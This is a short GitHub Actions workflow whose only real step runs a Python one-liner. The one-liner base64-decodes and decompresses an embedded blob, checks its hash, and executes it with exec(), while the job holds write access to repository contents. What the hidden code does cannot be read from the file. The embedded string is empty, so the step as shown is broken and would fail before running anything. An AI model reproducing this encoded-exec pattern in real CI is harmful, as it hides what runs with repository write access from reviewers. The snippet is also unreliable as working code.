name: Verify complete repaired code
on:
  push:
    branches: [validation/repaired-checks]
    paths: [.github/workflows/complete-check.yml]
permissions:
  contents: write
jobs:
  check:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ba462f5223a664caf86faec4bfa9f4ce836041d1
          fetch-depth: 0
      - uses: ./.github/actions/prepare-validation
      - run: python -c "import base64,hashlib,zlib; code=zlib.decompress(base64.b64decode('')); assert hashlib.sha256(code).hexdigest()=='8d71a79594ffa5015e7134d2d0256021c4baa81ede0203f82b697f8a3fa61c1b'; exec(compile(code,'complete-check.py','exec'))"
